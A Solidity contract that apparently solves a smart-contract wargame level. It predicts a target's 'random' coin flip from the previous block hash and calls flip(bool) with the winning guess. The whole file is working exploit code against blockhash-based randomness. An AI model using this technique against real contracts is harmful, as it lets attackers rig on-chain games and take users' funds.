// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipExploit {
  using SafeMath for uint256;
  address public immutable coinFlip;

  constructor(address target) {
    coinFlip = target;
  }

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 answer = blockValue.div(factor);
    bool side = answer == 1 ? true : false;
    (bool success, bytes memory data) = coinFlip.call(
      abi.encodeWithSignature("flip(bool)", side)
    );
    bool result = abi.decode(data, (bool));
    require(success, "Call failed");
    require(result, "Failed attempt");
  }
}
